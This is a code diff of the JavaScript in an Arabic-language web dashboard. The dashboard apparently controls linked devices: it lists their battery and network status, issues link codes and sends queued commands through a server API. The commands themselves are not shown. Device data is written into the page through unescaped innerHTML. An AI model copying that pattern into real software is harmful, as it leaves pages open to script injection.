-            autoRefresh = SettingsManager.isAutoConnect();
+            // Set server URL
+            document.getElementById('server-url-input').value = serverUrl;
             
-            // Update UI
-            document.getElementById('server-url').value = serverUrl;
-            document.getElementById('auto-connect-switch').classList.toggle('active', autoRefresh);
-            
-            // Setup online/offline detection
-            window.addEventListener('online', handleOnline);
-            window.addEventListener('offline', handleOffline);
+            // Check online status
             updateOnlineStatus();
+            window.addEventListener('online', () => { isOnline = true; updateOnlineStatus(); syncPendingCommands(); loadDashboard(); });
+            window.addEventListener('offline', () => { isOnline = false; updateOnlineStatus(); loadCachedData(); });
             
-            // Auto-connect if enabled
-            if (autoRefresh && serverUrl) {
-                connectToServer();
-            }
+            // Load data
+            loadDashboard();
+            loadCommands(currentCategory);
             
-            // Load pending commands
-            loadPendingCommands();
-        }
-        
-        function handleOnline() {
-            isOnline = true;
-            updateOnlineStatus();
-            showToast('تم استعادة الاتصال');
+            // Start auto refresh
+            setInterval(() => { if (isOnline) loadDashboard(); }, 15000);
             
-            // Sync pending commands
-            syncPendingCommands();
-            
-            // Refresh data
-            if (serverUrl) {
-                loadDashboard();
-            }
-        }
-        
-        function handleOffline() {
-            isOnline = false;
-            updateOnlineStatus();
-            showToast('وضع عدم الاتصال');
-            
-            // Load cached data
-            loadCachedData();
+            showToast('تم الاتصال بالخادم: ' + serverUrl);
         }
         
         function updateOnlineStatus() {
@@ -580,7 +749,9 @@
             const text = document.getElementById('status-text');
             const banner = document.getElementById('offline-banner');
             
-            if (navigator.onLine) {
+            isOnline = navigator.onLine;
+            
+            if (isOnline) {
                 dot.classList.remove('offline');
                 text.textContent = 'متصل';
                 banner.classList.add('hidden');
@@ -591,146 +762,54 @@
             }
         }
         
-        function connectToServer() {
-            const urlInput = document.getElementById('server-url');
-            serverUrl = urlInput ? urlInput.value.trim() : serverUrl;
-            
-            // Add https if missing
-            if (serverUrl && !serverUrl.startsWith('http')) {
-                serverUrl = 'https://' + serverUrl;
-                urlInput.value = serverUrl;
-            }
-            
-            if (!serverUrl) {
-                showToast('الرجاء إدخال رابط الخادم');
-                return;
-            }
-            
-            // Save settings
-            SettingsManager.setServerUrl(serverUrl);
-            
-            // Show dashboard
-            document.getElementById('config-screen').classList.add('hidden');
-            document.getElementById('dashboard').classList.remove('hidden');
-            
-            // Load data
-            loadDashboard();
-            
-            // Start auto refresh
-            if (autoRefresh) {
-                startAutoRefresh();
-            }
-            
-            showToast('تم الاتصال بنجاح');
-            
-            // Notify native
-            if (window.AndroidInterface) {
-                AndroidInterface.onServerConnected(serverUrl);
-            }
-        }
-        
-        async function testConnection() {
-            const urlInput = document.getElementById('server-url');
-            const url = urlInput.value.trim() || DEFAULT_SERVER;
-            
-            showToast('جاري اختبار الاتصال...');
-            
-            try {
-                const controller = new AbortController();
-                const timeout = setTimeout(() => controller.abort(), 10000);
-                
-                const res = await fetch(url + '/api/stats', {
-                    signal: controller.signal
-                });
-                
-                clearTimeout(timeout);
-                
-                if (res.ok) {
-                    showToast('✅ الخادم متصل ويعمل');
-                } else {
-                    showToast('❌ الخادم يستجيب لكن هناك خطأ');
-                }
-            } catch (error) {
-                showToast('❌ فشل الاتصال بالخادم');
-            }
-        }
-        
+        // ==================== API Functions ====================
         async function loadDashboard() {
-            if (!isOnline) {
-                loadCachedData();
-                return;
-            }
+            if (!isOnline) { loadCachedData(); return; }
             
             try {
-                // Fetch stats
-                const statsRes = await fetch(serverUrl + '/api/stats');
+                const [statsRes, devicesRes] = await Promise.all([
+                    fetch(serverUrl + '/api/stats'),
+                    fetch(serverUrl + '/api/devices')
+                ]);
+                
                 const statsData = await statsRes.json();
+                const devicesData = await devicesRes.json();
                 
                 if (statsData.ok) {
-                    const stats = statsData.stats;
-                    document.getElementById('devices-count').textContent = stats.devicesTotal || 0;
-                    document.getElementById('online-count').textContent = stats.devicesOnline || 0;
-                    document.getElementById('commands-count').textContent = stats.commandsTotal || 0;
-                    document.getElementById('pending-count').textContent = stats.commandsPending || 0;
-                    
-                    // Cache stats
-                    CacheManager.save('stats', stats);
+                    document.getElementById('devices-count').textContent = statsData.stats.devicesTotal || 0;
+                    document.getElementById('online-count').textContent = statsData.stats.devicesOnline || 0;
+                    document.getElementById('commands-count').textContent = statsData.stats.commandsTotal || 0;
+                    document.getElementById('pending-count').textContent = statsData.stats.commandsPending || 0;
+                    cacheData('stats', statsData.stats);
                 }
-                
-                // Fetch devices
-                const devicesRes = await fetch(serverUrl + '/api/devices');
-                const devicesData = await devicesRes.json();
                 
                 if (devicesData.ok) {
                     renderDevices(devicesData.devices);
+                    cacheData('devices', devicesData.devices);
                     
-                    // Cache devices
-                    CacheManager.save('devices', devicesData.devices);
-                    
-                    // Restore last selected device
-                    const lastDevice = SettingsManager.getLastDevice();
-                    if (lastDevice && devicesData.devices.find(d => d.id === lastDevice)) {
-                        selectedDevice = lastDevice;
-                    } else if (devicesData.devices.length > 0) {
+                    if (devicesData.devices.length > 0 && !selectedDevice) {
                         selectedDevice = devicesData.devices[0].id;
                     }
-                    
-                    // Update selection UI
-                    updateDeviceSelection();
                 }
-                
-                // Hide cached badge
-                document.getElementById('cached-badge').style.display = 'none';
-                
-            } catch (error) {
-                showToast('خطأ في الاتصال: ' + error.message);
+            } catch (e) {
+                console.error('Load error:', e);
                 loadCachedData();
             }
         }
         
         function loadCachedData() {
-            // Load cached stats
-            const cachedStats = CacheManager.get('stats');
-            if (cachedStats) {
-                const stats = cachedStats.data;
+            const stats = getCachedData('stats');
+            const devices = getCachedData('devices');
+            
+            if (stats) {
                 document.getElementById('devices-count').textContent = stats.devicesTotal || 0;
                 document.getElementById('online-count').textContent = stats.devicesOnline || 0;
                 document.getElementById('commands-count').textContent = stats.commandsTotal || 0;
                 document.getElementById('pending-count').textContent = stats.commandsPending || 0;
-                
-                document.getElementById('cached-badge').style.display = 'inline';
             }
             
-            // Load cached devices
-            const cachedDevices = CacheManager.get('devices');
-            if (cachedDevices) {
-                renderDevices(cachedDevices.data);
-                
-                const lastDevice = SettingsManager.getLastDevice();
-                if (lastDevice) {
-                    selectedDevice = lastDevice;
-                    updateDeviceSelection();
-                }
+            if (devices) {
+                renderDevices(devices);
             }
         }
         
@@ -738,142 +817,191 @@
             const container = document.getElementById('devices-list');
             
             if (!devices || devices.length === 0) {
-                container.innerHTML = '<p style="text-align: center; color: #94a3b8;">لا توجد أجهزة مربوطة</p>';
+                container.innerHTML = '<p style="text-align:center;color:#94a3b8;padding:20px;">لا توجد أجهزة مربوطة\nاستخدم كود الربط لإضافة جهاز جديد</p>';
                 return;
             }
             
-            container.innerHTML = devices.map(device => `
-                <div class="device-card ${selectedDevice === device.id ? 'selected' : ''}" onclick="selectDevice('${device.id}')">
+            container.innerHTML = devices.map(d => `
+                <div class="device-card ${selectedDevice === d.id ? 'selected' : ''}" onclick="selectDevice('${d.id}')">
                     <div class="device-info">
-                        <div class="device-status ${device.active ? '' : 'offline'}"></div>
+                        <div class="device-status ${d.active ? '' : 'offline'}"></div>
                         <div>
-                            <div style="font-weight: 500;">${device.name || device.id}</div>
-                            <div style="font-size: 12px; color: #94a3b8;">${device.model || 'غير محدد'}</div>
+                            <div style="font-weight:600">${d.name || d.id}</div>
+                            <div style="font-size:12px;color:#94a3b8">${d.model || 'غير محدد'} • ${d.os || ''}</div>
                         </div>
                     </div>
-                    <div style="font-size: 12px; color: #94a3b8;">
-                        🔋 ${device.battery || '-'}%
+                    <div style="text-align:left">
+                        <div style="font-size:12px;color:#94a3b8">🔋 ${d.battery || '-'}%</div>
+                        <div style="font-size:10px;color:#64748b">${d.networkType || ''}</div>
                     </div>
                 </div>
             `).join('');
         }
         
-        function selectDevice(deviceId) {
-            selectedDevice = deviceId;
-            SettingsManager.setLastDevice(deviceId);
-            updateDeviceSelection();
+        function selectDevice(id) {
+            selectedDevice = id;
+            renderDevices(getCachedData('devices') || []);
             showToast('تم تحديد الجهاز');
         }
         
-        function updateDeviceSelection() {
-            document.querySelectorAll('.device-card').forEach(card => {
-                card.classList.remove('selected');
-            });
+        async function generateLinkCode() {
+            showToast('جاري توليد كود الربط...');
             
-            if (selectedDevice) {
-                const cards = document.querySelectorAll('.device-card');
-                cards.forEach(card => {
-                    if (card.getAttribute('onclick').includes(selectedDevice)) {
-                        card.classList.add('selected');
-                    }
-                });
+            try {
+                const res = await fetch(serverUrl + '/api/link-code', { method: 'POST' });
+                const data = await res.json();
+                
+                if (data.ok && data.code) {
+                    document.getElementById('link-code-value').textContent = data.code;
+                    document.getElementById('link-code-container').classList.remove('hidden');
+                    showToast('✅ تم توليد الكود: ' + data.code);
+                } else {
+                    showToast('❌ فشل توليد الكود');
+                }
+            } catch (e) {
+                showToast('❌ خطأ: ' + e.message);
             }
         }
         
-        async function sendCommand(command) {
+        async function sendCommand(cmd) {
             if (!selectedDevice) {
-                showToast('الرجاء تحديد جهاز أولاً');
+                showToast('⚠️ الرجاء تحديد جهاز أولاً');
                 return;
-            }
-            
-            // Show pending state
-            const btn = document.querySelector(`[data-cmd="${command}"]`);
-            if (btn) {
-                btn.classList.add('pending');
             }
             
             if (!isOnline) {
-                // Save to pending commands
-                savePendingCommand(command, selectedDevice);
-                showToast('✅ تم حفظ الأمر - سيتم إرساله عند الاتصال');
-                if (btn) btn.classList.remove('pending');
+                savePendingCommand(cmd, selectedDevice);
+                showToast('✅ تم حفظ الأمر للإرسال لاحقاً');
                 return;
             }
             
+            showToast('جاري إرسال الأمر...');
+            
             try {
-                showToast('جاري إرسال الأمر...');
-                
                 const res = await fetch(serverUrl + '/api/commands', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        deviceId: selectedDevice,
-                        command: command
-                    })
+                    body: JSON.stringify({ deviceId: selectedDevice, command: cmd })
                 });
                 
                 const data = await res.json();
                 
                 if (data.ok) {
-                    showToast('✅ تم إرسال الأمر بنجاح');
-                    if (window.AndroidInterface) {
-                        AndroidInterface.vibrate(100);
-                    }
+                    showToast('✅ تم إرسال الأمر');
+                    if (window.AndroidInterface) AndroidInterface.vibrate(100);
                 } else {
                     showToast('❌ فشل إرسال الأمر');
                 }
-            } catch (error) {
-                // Save as pending if failed
-                savePendingCommand(command, selectedDevice);
-                showToast('❌ خطأ: تم حفظ الأمر للإرسال لاحقاً');
+            } catch (e) {
+                savePendingCommand(cmd, selectedDevice);
+                showToast('❌ تم حفظ الأمر للإرسال لاحقاً');
             }
-            
-            if (btn) btn.classList.remove('pending');
         }
         
-        function savePendingCommand(command, deviceId) {
+        async function testConnection() {
+            showToast('جاري اختبار الاتصال...');
+            
+            try {
+                const res = await fetch(serverUrl + '/api/stats', { signal: AbortSignal.timeout(10000) });
+                const data = await res.json();
+                
+                if (data.ok) {
+                    showToast('✅ الخادم متصل ويعمل بشكل صحيح');
+                } else {
+                    showToast('⚠️ الخادم يستجيب لكن هناك مشكلة');
+                }
+            } catch (e) {
+                showToast('❌ فشل الاتصال بالخادم: ' + e.message);
+            }
+        }
+        
+        function saveServerUrl() {
+            const input = document.getElementById('server-url-input');
+            let url = input.value.trim();
+            
+            if (url && !url.startsWith('http')) {
+                url = 'https://' + url;
+                input.value = url;
+            }
+            
+            serverUrl = url || SERVER_URL;
+            localStorage.setItem('serverUrl', serverUrl);
+            showToast('✅ تم حفظ الإعدادات');
+            loadDashboard();
+        }
+        
+        // ==================== Commands ====================
+        function selectCategory(cat) {
+            currentCategory = cat;
+            
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelector(`.tab[data-cat="${cat}"]`).classList.add('active');
+            
+            loadCommands(cat);
+        }
+        
+        function loadCommands(cat) {
+            const container = document.getElementById('commands-list');
+            const commands = COMMANDS[cat] || [];
+            
+            container.innerHTML = commands.map(c => `
+                <div class="command-btn" onclick="sendCommand('${c.cmd}')">
+                    <span>${c.emoji}</span>
+                    <span>${c.desc}</span>
+                </div>
+            `).join('');
+        }
+        
+        // ==================== Navigation ====================
+        function showSection(section) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.getElementById(section + '-section').classList.add('active');
+            
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.querySelector(`.nav-item[data-section="${section}"]`).classList.add('active');
+        }
+        
+        // ==================== Utilities ====================
+        function cacheData(key, data) {
+            try {
+                const cache = JSON.parse(localStorage.getItem(CACHE_KEY) || '{}');
+                cache[key] = { data, time: Date.now() };
+                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
+            } catch (e) {}
+        }
+        
+        function getCachedData(key) {
+            try {
+                const cache = JSON.parse(localStorage.getItem(CACHE_KEY) || '{}');
+                return cache[key]?.data || null;
+            } catch (e) { return null; }
+        }
+        
+        function savePendingCommand(cmd, deviceId) {
             const pending = JSON.parse(localStorage.getItem('pending_commands') || '[]');
-            pending.push({
-                command: command,
-                deviceId: deviceId,
-                timestamp: Date.now()
-            });
+            pending.push({ command: cmd, deviceId, time: Date.now() });
             localStorage.setItem('pending_commands', JSON.stringify(pending));
         }
         
-        function loadPendingCommands() {
-            pendingCommands = JSON.parse(localStorage.getItem('pending_commands') || '[]');
-        }
-        
         async function syncPendingCommands() {
-            if (pendingCommands.length === 0) return;
+            const pending = JSON.parse(localStorage.getItem('pending_commands') || '[]');
+            if (pending.length === 0) return;
             
-            showToast(`جاري إرسال ${pendingCommands.length} أوامر محفوظة...`);
+            showToast(`جاري إرسال ${pending.length} أوامر محفوظة...`);
             
             const failed = [];
-            
-            for (const cmd of pendingCommands) {
+            for (const cmd of pending) {
                 try {
                     const res = await fetch(serverUrl + '/api/commands', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            deviceId: cmd.deviceId,
-                            command: cmd.command
-                        })
+                        body: JSON.stringify({ deviceId: cmd.deviceId, command: cmd.command })
                     });
-                    
-                    if (!res.ok) {
-                        failed.push(cmd);
-                    }
-                } catch (e) {
-                    failed.push(cmd);
-                }
+                    if (!res.ok) failed.push(cmd);
+                } catch (e) { failed.push(cmd); }
             }
             
-            // Update pending commands
             localStorage.setItem('pending_commands', JSON.stringify(failed));
-            pendingCommands = failed;
             
             if (failed.length === 0) {
                 showToast('✅ تم إرسال جميع الأوامر المحفوظة');
@@ -882,45 +1010,21 @@
             }
         }
         
-        function refreshData() {
+        function refreshAllData() {
             showToast('جاري التحديث...');
             loadDashboard();
         }
         
-        function startAutoRefresh() {
-            if (refreshInterval) {
-                clearInterval(refreshInterval);
-            }
-            
-            refreshInterval = setInterval(() => {
-                if (isOnline && document.getElementById('dashboard').classList.contains('hidden') === false) {
-                    loadDashboard();
-                }
-            }, 30000); // Refresh every 30 seconds
+        function clearCache() {
+            localStorage.removeItem(CACHE_KEY);
+            showToast('✅ تم مسح الكاش');
         }
         
-        function toggleAutoConnect() {
-            autoRefresh = !autoRefresh;
-            document.getElementById('auto-connect-switch').classList.toggle('active', autoRefresh);
-            SettingsManager.setAutoConnect(autoRefresh);
-            
-            showToast(autoRefresh ? 'تم تفعيل الاتصال التلقائي' : 'تم إيقاف الاتصال التلقائي');
-        }
-        
-        function showConfig() {
-            document.getElementById('config-screen').classList.remove('hidden');
-            document.getElementById('dashboard').classList.add('hidden');
-            
-            if (refreshInterval) {
-                clearInterval(refreshInterval);
-            }
-        }
-        
-        function showToast(message) {
+        function showToast(msg) {
             if (window.AndroidInterface) {
-                AndroidInterface.showToast(message);
+                AndroidInterface.showToast(msg);
             } else {
-                console.log('Toast:', message);
+                console.log('Toast:', msg);
             }
         }
     </script>
